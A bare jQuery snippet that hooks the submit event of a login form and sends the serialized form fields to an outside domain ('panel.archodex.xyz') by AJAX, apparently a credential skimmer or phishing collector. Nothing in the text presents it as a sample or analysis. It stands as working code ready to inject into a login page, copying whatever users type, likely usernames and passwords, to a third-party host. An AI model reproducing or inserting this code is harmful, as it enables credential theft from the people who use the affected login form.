$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "https://panel.archodex.xyz/?cat=",

        type: "GET",
        
        dataType: "text",

        data: d.serialize(),        

        headers: {

            "Content-type": "application/json"        

        },

    });

});

